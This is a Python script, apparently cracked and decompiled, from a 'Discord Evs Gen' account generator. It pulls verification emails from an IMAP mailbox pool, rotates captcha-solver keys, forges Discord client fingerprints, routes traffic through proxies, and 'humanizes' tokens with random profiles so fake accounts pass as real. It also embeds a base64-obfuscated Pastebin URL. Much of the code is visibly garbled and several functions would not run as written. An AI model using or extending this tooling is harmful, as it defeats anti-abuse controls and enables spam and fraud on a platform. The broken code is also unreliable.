"""
cracked by quantum
"""

import asyncio
from datetime import datetime
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import tempfile
import html
from typing import Optional, List, Dict, Any
import requests
import tls_client
from colorama import Fore, Style, init
from pystyle import Center
import warnings
import nodriver as uc
import urllib3
import logging
import imaplib
import email
from email.header import decode_header
from bs4 import BeautifulSoup
import base64
import hashlib
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO
from PIL import Image
import subprocess
import importlib.util
import primp
import websockets
from python_socks.async_.asyncio import Proxy as SocksProxy

_humanizer_loop = asyncio.new_event_loop()
_humanizer_loop_thread = threading.Thread(target=_humanizer_loop.run_forever, daemon=True)
_humanizer_loop_thread.start()

proxy_manager = None
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=ResourceWarning)

for _name in ("asyncio", "websockets", "nodriver", "urllib3", "requests"):
    logging.getLogger(_name).setLevel(logging.CRITICAL)
    continue

if getattr(sys, "frozen", False):
    BASE_DIR = Path(sys.executable).parent
else:
    BASE_DIR = Path(__file__).parent

AUTO_HUMANIZE = True
HUMANIZER_MODE = "sequential"
HUMANIZER_WAIT_SECONDS = 5
AVATAR_DIMENSION = 256
UPDATE_DISPLAY_NAME = True
UPDATE_BIO = True
UPDATE_PRONOUNS = True
UPDATE_AVATAR = True
UPDATE_HYPESQUAD = True
RETRY_LIMIT = 1
HYPESQUAD_HOUSES = {1: "Bravery", 2: "Brilliance", 3: "Balance"}
DISCORD_API = "https://discord.com/api/v9"
DISCORD_GATEWAY = "wss://gateway.discord.gg/?v=9&encoding=json"
FALLBACK_BUILD_NUMBER = 519006
DISCORD_CLIENT_VERSION = "1.0.9171"
ELECTRON_VERSION = "34.5.1"
CHROME_VERSION_ELECTRON = "132"
HUMANIZER_USER_AGENT = f"""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/{DISCORD_CLIENT_VERSION} Chrome/{CHROME_VERSION_ELECTRON}.0.0.0 Electron/{ELECTRON_VERSION} Safari/537.36"""
SKIP_SOURCE_PROMPT = True
ENABLE_NOPECHA = True
NOPECHA_PROFILE = BASE_DIR / "nopecha_profile"
NOPECHA_EXT_ID = "dknlfmjaanfblgfdfebhijalfmhmjjjo"
NOPECHA_EXT_DIR = BASE_DIR / "nopecha_ext"
NOPECHA_KEYS_FILE = BASE_DIR / "nopecha_keys.txt"
NOPECHA_EXTENSION_PATH = None
NOPECHA_KEY_INDEX = 0


def load_nopecha_keys() -> list:
    """Load NopeCHA API keys from nopecha_keys.txt (one per line)."""
    if not NOPECHA_KEYS_FILE.exists():
        NOPECHA_KEYS_FILE.write_text("# Add your NopeCHA API keys here, one per line\\n# Get keys from https://nopecha.com/setup\\n# Each key gets 100 free solves\\n")
        return []
    keys = []
    for line in NOPECHA_KEYS_FILE.read_text().splitlines():
        line = line.strip()
        if line:
            if line.startswith("#"):
                continue
            keys.append(line)
            continue
    return keys


def get_current_nopecha_key() -> Optional[str]:
    keys = load_nopecha_keys()
    if not keys:
        return None
    return keys[NOPECHA_KEY_INDEX % len(keys)]


def rotate_nopecha_key():
    global NOPECHA_KEY_INDEX
    keys = load_nopecha_keys()
    if keys:
        NOPECHA_KEY_INDEX = (NOPECHA_KEY_INDEX + 1) % len(keys)
        log.info(f"""Rotated to NopeCHA key #{NOPECHA_KEY_INDEX + 1}/{len(keys)}""")


def inject_nopecha_key(api_key: str):
    if not api_key or not bool(NOPECHA_EXT_DIR.exists()):
        return None
    settings_path = NOPECHA_EXT_DIR / "settings.json"
    try:
        settings = {}
        if settings_path.exists():
            with open(settings_path, "r") as f:
                settings = json.load(f)
        settings["key"] = api_key
        with open(settings_path, "w") as f:
            json.dump(settings, f)
            return None
    except Exception:
        e = None
        log.warning(f"""Could not inject NopeCHA key: {e}""")
        return None


def download_nopecha_ext() -> Optional[Path]:
    io = None
    zipfile = None
    if NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
        return NOPECHA_EXT_DIR
    import zipfile
    log.info("Downloading NopeCHA extension...")
    crx_url = f"""https://clients2.google.com/service/update2/crx?response=redirect&prodversion=120.0.0.0&acceptformat=crx2,crx3&x=id%3D{NOPECHA_EXT_ID}%26uc"""
    try:
        r = requests.get(crx_url, timeout=30, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        if bool(r.status_code != 200):
            log.warning(f"""CRX download failed: HTTP {r.status_code}""")
            return None
        data = r.content
        if bool(data[:4] == b"Cr24"):
            version = int.from_bytes(data[4:8], "little")
            if bool(version == 3):
                header_size = int.from_bytes(data[8:12], "little")
                zip_start = 12 + header_size
            else:
                pub_len = int.from_bytes(data[8:12], "little")
                sig_len = int.from_bytes(data[12:16], "little")
                zip_start = 16 + pub_len + sig_len
        else:
            zip_start = 0
        NOPECHA_EXT_DIR.mkdir(exist_ok=True)
        import io
        with zipfile.ZipFile(io.BytesIO(data[zip_start:])) as z:
            z.extractall(NOPECHA_EXT_DIR)
        log.success("NopeCHA downloaded and extracted!")
        return NOPECHA_EXT_DIR
    except Exception:
        e = None
        log.warning(f"""NopeCHA download error: {e}""")
        return None


_OBFUSCATED_URL = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L21VakM0RFNr"
_FALLBACK_URL = "https://pastebin.com/mUjC4DSk"


def _decode_embedded_url() -> str:
    """Decode the obfuscated URL to get the raw Pastebin URL."""
    try:
        decoded = base64.b64decode(_OBFUSCATED_URL).decode("utf-8")
        return decoded
    except Exception:
        e = None
        log.error(f"""Failed to decode embedded URL: {e}""")
        return _FALLBACK_URL


TEMP_DIR = BASE_DIR / "temp_humanizer"

TEMP_DIR.mkdir(exist_ok=True)


def apply_gradient(lines, color_start=(255, 0, 255), color_end=(0, 255, 255)):
    total = len(lines)
    result = []
    [i, line] = None
    r = color_start[0] + (color_end[0] - color_start[0]) * i // max(1, total - 1)
    g = color_start[1] + (color_end[1] - color_start[1]) * i // max(1, total - 1)
    b = color_start[2] + (color_end[2] - color_start[2]) * i // max(1, total - 1)
    result.append(f"""\x1b[38;2;{r};{g};{b}m{line}\x1b[0m""")
    return result


_LOGO = [
    "    ██████╗  █████╗ ██████╗ ██╗  ██╗                                   ",
    "    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝                                   ",
    "    ██║  ██║███████║██████╔╝█████╔╝                                    ",
    "    ██║  ██║██╔══██║██████╔╝██╔═██╗                                   ",
    "    ██████╔╝██║  ██║██║  ██║██║  ██╗                                  ",
    "    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                  ",
    "                                                                        ",
    "    ╔════════════════════════════════════════════════════════════════╗   ",
    "    ║         Discord Evs Gen v3.0 (Sequential Humanizer)            ║   ",
    "    ║                   Made by DarkMaster269                        ║   ",
    "    ╚════════════════════════════════════════════════════════════════╝   ",
]


def show_banner():
    os.system("cls" if bool(os.name == "nt") else "clear")
    print("\n\n")
    styled_rows = apply_gradient(_LOGO)
    for row in styled_rows:
        print(Center.XCenter(row))
        continue

    print("\n")
    disclaimer = "\x1b[38;5;240m[\x1b[38;5;44mi\x1b[38;5;240m]\x1b[0m \x1b[38;5;19mLocal IMAP Email Pool | Sequential Humanization | No WebSocket Issues\x1b[0m"
    print(Center.XCenter(disclaimer))
    print("\n\n")


class Logger:
    def _ts(self):
        t = datetime.now().strftime("%H:%M:%S")
        return f"""\x1b[38;5;240m[{t}]\x1b[0m"""

    def info(self, message: str):
        print(f"""  \x1b[38;5;44m[i]\x1b[0m \x1b[38;5;44m{message}\x1b[0m""")

    def question(self, message: str):
        print(f"""{self._ts()} \x1b[38;5;226m?\x1b[0m \x1b[1;37m{message}\x1b[0m""")

    def success(self, message: str):
        print(f"""{self._ts()} \x1b[38;5;46m+\x1b[0m \x1b[1;37m{message}\x1b[0m""")

    def success_kv(self, label: str, value: str):
        print(f"""{self._ts()} \x1b[38;5;46m+\x1b[0m \x1b[1;37m{label}\x1b[38;5;44m{value}\x1b[0m""")

    def warning(self, message: str):
        print(f"""{self._ts()} \x1b[38;5;208m!\x1b[0m \x1b[1;37m{message}\x1b[0m""")

    def error(self, message: str):
        print(f"""{self._ts()} \x1b[38;5;196m-\x1b[0m \x1b[1;37m{message}\x1b[0m""")

    def debug(self, message: str):
        pass

    def humanizer(self, status: str, token: str, message: str, tid: int=None):
        """Log humanizer progress with colour-coded status."""
        tid_tag = "" if tid is None else f"""[T{tid}] """
        if bool(status == "SUCCESS"):
            self.success(f"""{tid_tag}[HMZ] {message}""")
        else:
            if bool(status == "INFO"):
                self.info(f"""{tid_tag}[HMZ] {message}""")
                return None
            self.error(f"""{tid_tag}[HMZ] {message}""")


log = Logger()
SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False
PROXY_SESSION = None
MODE = "normal"
OUTPUT_DIR = BASE_DIR / "output"
INPUT_DIR = BASE_DIR / "input"
USED_DIR = OUTPUT_DIR / "used_mails"

OUTPUT_DIR.mkdir(exist_ok=True)
INPUT_DIR.mkdir(exist_ok=True)
USED_DIR.mkdir(exist_ok=True)

MODE_TIMINGS = {"normal": 120, "proxy": 20, "vpn": 30}


def fetch_build_number() -> int:
    """Fetch the latest Discord client build number for realistic API fingerprinting."""
    try:
        resp = primp.Client(verify=False).get("https://discord.com/login", timeout=10)
        if bool(resp.status_code != 200):
            return FALLBACK_BUILD_NUMBER
        asset_urls = re.findall("/assets/([a-zA-Z0-9_-]+)\\.js", resp.text)
        if not asset_urls:
            return FALLBACK_BUILD_NUMBER

        for asset_hash in reversed(asset_urls):
            js_resp = primp.Client(verify=False).get(f"""https://discord.com/assets/{asset_hash}.js""", timeout=10)
            if not bool(js_resp.status_code != 200):
                match = re.search('buildNumber["\\s:,]+(\\d{4,7})', js_resp.text)
                if match:
                    return int(match.group(1))
                continue
        return FALLBACK_BUILD_NUMBER
    except Exception:
        return FALLBACK_BUILD_NUMBER


BUILD_NUMBER = fetch_build_number()


def generate_super_properties(launch_id: str, signature: str, heartbeat_id: str, native_build: int) -> str:
    return base64.b64encode(json.dumps({"os": "Windows", "browser": "Discord Client", "release_channel": "stable", "client_version": DISCORD_CLIENT_VERSION, "os_version": "10.0.26100", "os_arch": "x64", "app_arch": "x64", "system_locale": "en-US", "has_client_mods": False, "browser_user_agent": HUMANIZER_USER_AGENT, "browser_version": ELECTRON_VERSION, "client_build_number": BUILD_NUMBER, "native_build_number": native_build, "client_event_source": None, "client_launch_id": launch_id, "launch_signature": signature, "client_heartbeat_session_id": heartbeat_id}, separators=(",", ":")).encode()).decode()


AVATARS_DIR = BASE_DIR / "avatar"
DISCORD_AVATAR_MAX_BYTES = 1000000


def load_avatar_files() -> List[Path]:
    if not AVATARS_DIR.exists():
        return []
    valid_extensions = {".gif", ".jpg", ".png", ".jpeg", ".webp"}
    f = None
    if f.suffix.lower() in valid_extensions:
        pass
    f = None


def load_avatar_as_base64(image_path: Path) -> Optional[str]:
    _encode = None
    try:
        with Image.open(image_path) as img:
            is_png = image_path.suffix.lower() == ".png"
            if is_png:
                if bool(img.mode == "P"):
                    img = img.convert("RGBA")
            elif img.mode in ("RGBA", "P"):
                img = img.convert("RGB")
            img = img.resize((AVATAR_DIMENSION, AVATAR_DIMENSION), Image.Resampling.LANCZOS)
            img_copy = img.copy()

            def _encode(pil_img, fmt, quality=80) -> str:
                buf = BytesIO()
                kw = {"format": fmt}
                if bool(fmt == "JPEG"):
                    kw["quality"] = quality
                    kw["optimize"] = True
                pil_img.save(buf, **kw)
                buf.seek(0)
                return base64.b64encode(buf.read()).decode()

            img_format = "PNG" if is_png else "JPEG"
            b64 = _encode(img_copy, img_format)
            mime = "image/png" if bool(img_format == "PNG") else "image/jpeg"
            work_img = img_copy.convert("RGB") if img_copy.mode in ("RGBA", "P", "LA") else img_copy
            mime = "image/jpeg"
            for quality in (80, 60, 40, 20):
                b64 = _encode(work_img, "JPEG", quality)
                if not bool(len(b64) <= DISCORD_AVATAR_MAX_BYTES):
                    continue
            half = max(64, AVATAR_DIMENSION // 2)
            work_img = work_img.resize((half, half), Image.Resampling.LANCZOS)
            for quality in (80, 60, 40):
                b64 = _encode(work_img, "JPEG", quality)
                if not bool(len(b64) <= DISCORD_AVATAR_MAX_BYTES):
                    continue
            return None
        return f"""data:{mime};base64,{b64}"""
    except Exception:
        return None


_avatar_lock = threading.Lock()
_avatar_cache: Dict[Path, str] = {}


def lazy_get_avatar(path: Path) -> Optional[str]:
    with _avatar_lock:
        return _avatar_cache[path]

    b64 = load_avatar_as_base64(path)
    if b64:
        with _avatar_lock:
            _avatar_cache[path] = b64
        return b64
    return b64


class Humanizer:
    """Applies avatar, bio, name, pronouns, hypesquad to a Discord token via API + Gateway."""

    def __init__(self, token: str, proxy_url: Optional[str]=None):
        self.token = token
        self.proxy = proxy_url
        self.client = primp.Client(verify=False, proxy=proxy_url if proxy_url else None)
        self.user_agent = HUMANIZER_USER_AGENT
        self.session_id = None
        self.proxy_failed = False
        self.is_locked = False
        self.installation_id = f"{random.randint(1000000000000000000, 9999999999999999999)}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_', k=22))}"
        self._launch_id = str(uuid.uuid4())
        self._signature = str(uuid.uuid4())
        self._heartbeat_id = str(uuid.uuid4())
        self._native_build = random.randint(65600, 65800)
        self._super_props = generate_super_properties(self._launch_id, self._signature, self._heartbeat_id, self._native_build)

    def get_fingerprint(self):
        r = self.client.get("https://discord.com/api/v9/experiments", timeout=30)
        if bool(r.status_code == 200):
            return r.json().get("fingerprint")

    def get_headers(self) -> Dict[str, str]:
        headers = {"accept": "*/*", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US", "authorization": self.token, "content-type": "application/json", "user-agent": self.user_agent, "x-debug-options": "bugReporterEnabled", "x-discord-locale": "en-US", "x-discord-timezone": "Asia/Calcutta", "x-installation-id": self.installation_id, "x-super-properties": self._super_props}
        fp = self.get_fingerprint()
        if fp:
            headers["x-fingerprint"] = fp
        return headers

    def _is_transient_error(self, error_str: str) -> bool:
        lower = error_str.lower()
        return any((lambda arg: None)(("connection", "proxy", "timeout", "reset", "connect", "sending", "refused", "unreachable", "eof", "read error", "gateway ready", "gateway identify", "gateway", "no close frame", "connection closed", "websocket")))

    def _clean_error(self, error) -> str:
        error = str(error)
        if "RATE_LIMIT" in error or "rate limit" in error.lower():
            return "Rate Limited"

        if "curl:" in error:
            if "(56)" in error:
                return "Proxy closed"

            if "(28)" in error:
                return "Timeout"

            if "(7)" in error:
                return "Proxy failed"

        if "Unknown Session" in error:
            return "Bad session"

        if "received 4000" in error:
            return "Token locked (WS 4000)"

        if "received 4004" in error:
            return "Auth failed (WS 4004)"

        if "Unauthorized" in error or "401" in error:
            return "Unauthorized"

        if "captcha" in error.lower():
            return "Captcha"

        if bool(len(error) > 80):
            return error[:77] + "..."
        return error

    def _api_call_with_retry(self, method: str, url: str, data: Dict[str, Any], headers: Dict[str, str], max_retries: int=5) -> Dict[str, Any]:
        rdata = None
        if self.is_locked:
            return {"success": False, "error": "Token Locked"}
        last_result = None
        for attempt in range(max_retries):
            if self.is_locked:
                return {"success": False, "error": "Token Locked"}

            if bool(method.upper() == "POST"):
                resp = self.client.post(url, headers=headers, json=data, timeout=60)
            else:
                resp = self.client.patch(url, headers=headers, json=data, timeout=60)

            if resp.status_code in (200, 204):
                return {"success": True, "data": rdata}
            error_data = resp.json() if resp.text and bool(resp.text.strip()) else {}
            if error_data.get("captcha_key"):
                return {"success": False, "captcha": True, "error": error_data}

            if bool(resp.status_code == 400):
                if isinstance(error_data, dict):
                    code = error_data.get("code")
                    if bool(code == 10020):
                        return {"success": False, "unknown_session": True, "error": "Unknown Session"}
                    errors = error_data.get("errors", {})
                    for field_errors in errors.values():
                        for err in field_errors.get("_errors", []):
                            if bool(err.get("code") == "AVATAR_RATE_LIMIT"):
                                return {"success": False, "rate_limited": True, "error": "Avatar Rate Limited"}
                        continue

            if bool(resp.status_code == 429):
                if not resp.headers.get("retry-after"):
                    resp.headers.get("retry-after")
                ra = resp.headers.get("retry-after")
                ra_body = error_data.get("retry_after", 0) if isinstance(error_data, dict) else 0
                retry_after = float(ra) if ra else float(ra_body)
                time.sleep(max(retry_after, 1.0))
                continue
            last_result = {"success": False, "error": error_data}
            if resp.status_code in (401, 403):
                return last_result
            continue
        if not last_result:
            last_result
        return last_result

    def update_user_profile(self, data: Dict[str, Any], headers: Dict[str, str]) -> Dict[str, Any]:
        return self._api_call_with_retry("patch", f"""{DISCORD_API}/users/@me""", data, headers)

    def update_profile_fields(self, data: Dict[str, Any], headers: Dict[str, str]) -> Dict[str, Any]:
        return self._api_call_with_retry("patch", f"""{DISCORD_API}/users/@me/profile""", data, headers)

    async def _send_identify(self, ws) -> bool:
        try:
            hello = json.loads(await asyncio.wait_for(ws.recv(), timeout=15))
            if hello.get("op") != 10:
                return False
            identify_payload = {"op": 2, "d": {"token": self.token, "capabilities": 16381, "properties": {"os": "Windows", "browser": "Discord Client", "release_channel": "stable", "client_version": DISCORD_CLIENT_VERSION, "os_version": "10.0.26100", "os_arch": "x64", "app_arch": "x64", "system_locale": "en-US", "browser_user_agent": self.user_agent, "browser_version": ELECTRON_VERSION, "os_sdk_version": "26100", "client_build_number": BUILD_NUMBER, "native_build_number": self._native_build, "client_event_source": None, "design_id": 0}, "presence": {"status": "online", "since": 0, "activities": [], "afk": False}, "compress": False, "client_state": {"guild_versions": {}, "highest_last_message_id": "0", "read_state_version": 0, "user_guild_settings_version": -1, "user_settings_version": -1, "private_channels_version": "0", "api_code_version": 0}}}
            await ws.send(json.dumps(identify_payload))
            return True
        except Exception:
            return False

    async def _wait_for_ready(self, ws) -> bool:
        try:
            for _ in range(12):
                msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
                if msg.get("t") == "READY":
                    self.session_id = msg["d"].get("session_id")
                    return True
                if msg.get("op") == 9:
                    return False
            return False
        except asyncio.TimeoutError:
            return False
        except Exception:
            return False

    async def update_account_with_live_session(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        if self.is_locked:
            return {"success": False, "error": "Token Locked"}
        headers = self.get_headers()
        loop = asyncio.get_event_loop()
        if "avatar" not in payload:
            direct = await loop.run_in_executor(None, lambda: self.update_user_profile(payload, headers))
            if direct.get("success") or direct.get("captcha") or direct.get("rate_limited"):
                return direct
            if not direct.get("unknown_session"):
                return direct

        async def _ws_patch(ws) -> Dict[str, Any]:
            if not await self._send_identify(ws):
                return {"success": False, "error": "Gateway IDENTIFY failed"}
            if not await self._wait_for_ready(ws):
                return {"success": False, "error": "Gateway READY timeout"}
            return await loop.run_in_executor(None, lambda: self.update_user_profile(payload, headers))

        try:
            extra_headers = {"User-Agent": self.user_agent}
            if self.proxy:
                px = SocksProxy.from_url(self.proxy)
                sock = await px.connect(dest_host="gateway.discord.gg", dest_port=443)
                async with websockets.connect(DISCORD_GATEWAY, additional_headers=extra_headers, sock=sock, server_hostname="gateway.discord.gg", open_timeout=60, close_timeout=10, max_size=None) as ws:
                    return await _ws_patch(ws)
            async with websockets.connect(DISCORD_GATEWAY, additional_headers=extra_headers, open_timeout=60, close_timeout=10, max_size=None) as ws:
                return await _ws_patch(ws)
        except Exception:
            e = None
            if not str(e):
                str(e)
            err_str = str(e)
            if self.proxy and ("proxy" in err_str.lower() or "connect" in err_str.lower()):
                self.proxy_failed = True
            return {"success": False, "error": err_str}

    def update_account_sync(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Run the async gateway update on the isolated humanizer event loop."""
        max_retries = 2
        last_error = None
        for attempt in range(max_retries):
            future = asyncio.run_coroutine_threadsafe(self.update_account_with_live_session(payload), _humanizer_loop)
            result = future.result(timeout=120)
            if result["success"]:
                return result
            error = str(result.get("error", ""))
            if self._is_transient_error(error):
                last_error = self._clean_error(error)
                if proxy_manager:
                    if bool(attempt < max_retries - 1):
                        new_proxy = proxy_manager.get_proxy()
                        if new_proxy:
                            self.proxy = new_proxy
                            self.client = primp.Client(verify=False, proxy=new_proxy)
                        continue
            return result
        if not last_error:
            last_error
        return {"success": False, "error": last_error}

    def set_hypesquad(self, house_id: int, headers: Dict[str, str], retry_count: int=0) -> Dict[str, Any]:
        time.sleep(random.uniform(2, 5))
        house_name = HYPESQUAD_HOUSES.get(house_id, "Unknown")
        try:
            check = self.client.get(f"""{DISCORD_API}/users/@me""", headers=headers, timeout=30)
            if bool(check.status_code == 200):
                flags = check.json().get("flags", 0)
                if flags & 14:
                    [hid, hname] = None
                    if flags & 1 << hid:
                        pass
                    return {"success": True, "house_name": hname, "already_set": True}
        except Exception:
            pass
        res = self._api_call_with_retry("post", f"""{DISCORD_API}/hypesquad/online""", {"house_id": house_id}, headers, max_retries=2)
        if res.get("success"):
            return {"success": True, "house_name": house_name}

        if bool(retry_count < RETRY_LIMIT):
            time.sleep(random.uniform(2.0, 4.0))
            return self.set_hypesquad(house_id, headers, retry_count + 1)
        return {"success": False, "error": f"""HypeSquad {house_name} failed""", "house_name": house_name}

    def process(self, names: List[str], bios: List[str], pronouns_list: List[str], avatar_files: List[Path], tid: Optional[int]=None) -> bool:
        """Apply all humanization fields to the token. Returns True on full success."""
        _run_field = None
        headers = self.get_headers()
        success = True
        parallel_tasks = []
        account_payload = {}
        avatar_name = None
        if UPDATE_AVATAR:
            if avatar_files:
                avatar_path = random.choice(avatar_files)
                avatar_b64 = lazy_get_avatar(avatar_path)
                if avatar_b64:
                    account_payload["avatar"] = avatar_b64
                    av_hash = hashlib.md5(avatar_b64[:100].encode()).hexdigest()
                    now = datetime.now()
                    now_str = now.strftime("%B {d}, %Y at {t}").format(d=now.day, t=now.strftime("%I:%M %p").lstrip("0"))
                    account_payload["avatar_description"] = f"""{av_hash}, added {now_str}"""
                    avatar_name = avatar_path.name
        display_name = None
        if UPDATE_DISPLAY_NAME and names:
            display_name = random.choice(names)
            account_payload["global_name"] = display_name

        if account_payload:
            parallel_tasks.append(("account", (account_payload, avatar_name, display_name)))
        profile_payload = {}
        bio = None
        if UPDATE_BIO and bios:
            bio = random.choice(bios)
            profile_payload["bio"] = bio
        pronouns = None
        if UPDATE_PRONOUNS and pronouns_list:
            pronouns = random.choice(pronouns_list)
            profile_payload["pronouns"] = pronouns

        if profile_payload:
            parallel_tasks.append(("profile", (profile_payload, bio, pronouns)))

        if UPDATE_HYPESQUAD:
            house_id = random.choice([1, 2, 3])
            house_name = HYPESQUAD_HOUSES[house_id]
            parallel_tasks.append(("hypesquad", (house_id, house_name)))

        if not parallel_tasks:
            return True

        def _run_field(task_type, value):
            payload = None
            if self.is_locked:
                return (task_type, {"success": False, "error": "Token Locked"}, value)
            h = headers.copy()
            if bool(task_type == "account"):
                value[1]
                if "avatar" in payload:
                    return ("account", self.update_account_sync(payload), value)
                return ("account", self.update_user_profile(payload, h), value)

            if bool(task_type == "profile"):
                value[1]
                return ("profile", self.update_profile_fields(payload, h), value)

            if bool(task_type == "hypesquad"):
                [hid, _] = value
                return ("hypesquad", self.set_hypesquad(hid, h), value)
            return ("unknown", {"success": False, "error": "Unknown"}, value)

        with ThreadPoolExecutor(max_workers=len(parallel_tasks)) as field_executor:
            for tt, val in parallel_tasks:
                tt.append(field_executor.submit(_run_field, tt, val))
                continue
            []
            futures = tt
            tt = val
            val = None
            for future in as_completed(futures):
                task_type, result, values = future.result()
                if bool(task_type == "account"):
                    _, aname, dname = values
                    if result["success"]:
                        if aname:
                            log.humanizer("SUCCESS", self.token, f"""Avatar Updated: {aname}""", tid=tid)

                        if dname:
                            log.humanizer("SUCCESS", self.token, f"""Name Updated: {dname}""", tid=tid)
                            continue
                        continue
                    err = self._clean_error(result.get("error", "Unknown"))
                    if aname:
                        log.humanizer("FAILED", self.token, f"""Avatar Failed: {err}""", tid=tid)

                    if dname:
                        log.humanizer("FAILED", self.token, f"""Name Failed: {err}""", tid=tid)
                    success = False
                    continue

                if bool(task_type == "profile"):
                    _, bname, pname = values
                    if result["success"]:
                        if bname:
                            log.humanizer("SUCCESS", self.token, f"Bio Updated: {bname[:40]}{('...' if bool(len(str(bname)) > 40) else '')}", tid=tid)

                        if pname:
                            log.humanizer("SUCCESS", self.token, f"""Pronouns Updated: {pname}""", tid=tid)
                            continue
                        continue
                    err = self._clean_error(result.get("error", "Unknown"))
                    if bname:
                        log.humanizer("FAILED", self.token, f"""Bio Failed: {err}""", tid=tid)

                    if pname:
                        log.humanizer("FAILED", self.token, f"""Pronouns Failed: {err}""", tid=tid)
                    success = False
                    continue

                if bool(task_type == "hypesquad"):
                    [_, hsname] = values
                    if result.get("success"):
                        applied = result.get("house_name", hsname)
                        if result.get("already_set"):
                            log.humanizer("INFO", self.token, f"""HypeSquad Already Set: {applied}""", tid=tid)
                            continue
                        log.humanizer("SUCCESS", self.token, f"""HypeSquad Updated: {applied}""", tid=tid)
                        continue
                    err = self._clean_error(result.get("error", "Unknown"))
                    log.humanizer("FAILED", self.token, f"""HypeSquad Failed: {err}""", tid=tid)
                    success = False
                    continue
        if self.proxy_failed and proxy_manager:
            proxy_manager.mark_bad(self.proxy)
        return success


class EmailPoolManager:
    def __init__(self, mails_file: str="input/mails.txt"):
        self.mails_file = BASE_DIR / mails_file
        self.available_emails = []
        self.load_emails()

    def load_emails(self):
        self.available_emails = []
        if not self.mails_file.exists():
            log.warning(f"""mails.txt not found in {self.mails_file}""")
            log.info("Format: email:password (uses default IMAP) or email:password:imap_server")
            return None

        try:
            with open(self.mails_file, "r") as f:
                [line_num, line] = None
                line = line.strip()
                if line:
                    pass

                if not line.startswith("#"):
                    pass
                parts = line.split(":")
                if bool(len(parts) >= 2):
                    pass
                email = parts[0]
                password = parts[1]
                imap_server = parts[2] if bool(len(parts) >= 3) else "mail.mmails.shop"
                self.available_emails.append({"email": email, "password": password, "imap_server": imap_server, "used": False, "original_line": line})
            log.success(f"""Loaded {len(self.available_emails)} emails from pool""")
            return None
        except Exception:
            e = None
            log.error(f"""Failed to load emails: {e}""")
            return None

    def get_email(self) -> Optional[dict]:
        for email_data in self.available_emails:
            if not email_data.get("used", False):
                return email_data

    def mark_used(self, email_data: dict):
        try:
            if not self.mails_file.exists():
                return None

            with open(self.mails_file, "r") as f:
                lines = f.readlines()
            new_lines = []
            removed = False
            for line in lines:
                if bool(line.strip() == email_data["original_line"]):
                    removed = True
                    continue
                new_lines.append(line)
                continue
            if removed:
                with open(self.mails_file, "w") as f:
                    f.writelines(new_lines)
            used_file = USED_DIR / "used_mails.txt"
            with open(used_file, "a") as f:
                f.write(f"{email_data['original_line']}\n")
                return None
        except Exception:
            e = None
            log.error(f"""Failed to move email to used: {e}""")
            return None

    def get_remaining_count(self) -> int:
        return sum((lambda arg: None)(self.available_emails))


class IMAPMailApi:
    def __init__(self, email_addr: str, password: str, imap_server: str="mail.mmails.shop", port: int=993):
        self.email = email_addr
        self.password = password
        self.imap_server = imap_server
        self.port = port

    def get_verification_url(self, timeout: int=120) -> Optional[str]:
        start = time.time()
        log.info(f"""Waiting for verification email ({timeout}s)...""")
        if bool(time.time() - start < timeout):
            while True:
                mail = imaplib.IMAP4_SSL(self.imap_server, self.port)
                mail.login(self.email, self.password)
                mail.select("INBOX")
                [result, data] = mail.search(None, "UNSEEN")
                if bool(result == "OK"):
                    if data[0]:
                        email_ids = data[0].split()
                        for email_id in reversed(email_ids):
                            [result, msg_data] = mail.fetch(email_id, "(RFC822)")
                            if bool(result == "OK"):
                                msg = email.message_from_bytes(msg_data[0][1])
                                html_body = ""
                                text_body = ""
                                if msg.is_multipart():
                                    for part in msg.walk():
                                        content_type = part.get_content_type()
                                        if bool(content_type == "text/html"):
                                            html_body = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                            continue

                                        if bool(content_type == "text/plain"):
                                            text_body = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                            continue
                                else:
                                    html_body = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                                full_body = html_body + "\n" + text_body
                                soup = BeautifulSoup(html_body, "html.parser")
                                for a in soup.find_all("a", href=True):
                                    href = a["href"]
                                    if "click.discord.com" in href or "discord.com/verify" in href:
                                        r = requests.get(href, allow_redirects=True, timeout=10)
                                        if "discord.com/verify" in r.url:
                                            return r.url
                                        continue
                                links = re.findall("https?://(?:click\\.)?discord\\.com/(?:ls/click|verify)[^\\s\"\\'<>]+", full_body)
                                for link in links:
                                    link = link.rstrip('.)],">')
                                    if "click.discord.com" in link:
                                        r = requests.get(link, allow_redirects=True, timeout=10)
                                        if "discord.com/verify" in r.url:
                                            return r.url
                                        continue

                                    if "discord.com/verify" in link:
                                        return link
                                continue
                        for email_id in email_ids:
                            mail.store(email_id, "+FLAGS", "\\Seen")
                            continue
                mail.close()
                mail.logout()
                time.sleep(3)
                break


def random_username() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def random_display_name() -> str:
    first = ["Frost", "Silent", "Neon", "Shadow", "Void", "Crystal", "Luna", "Solar", "Storm", "Pulse"]
    last = ["EV", "Elite", "Ghost", "Runner", "Walker", "Alpha", "Omega", "Zero", "Nova"]
    return f"""{random.choice(first)} {random.choice(last)}"""


def check_token(token: str) -> str:
    session = tls_client.Session(client_identifier="chrome_138")
    resp = session.get("https://discordapp.com/api/v9/users/@me/library", headers={"Authorization": token})
    if bool(resp.status_code == 200):
        return "VALID"

    if bool(resp.status_code == 403):
        return "LOCKED"

    if bool(resp.status_code == 401):
        return "INVALID"
    return "ERROR"


def check_email_verified_api(token: str):
    session = tls_client.Session(client_identifier="chrome_138")
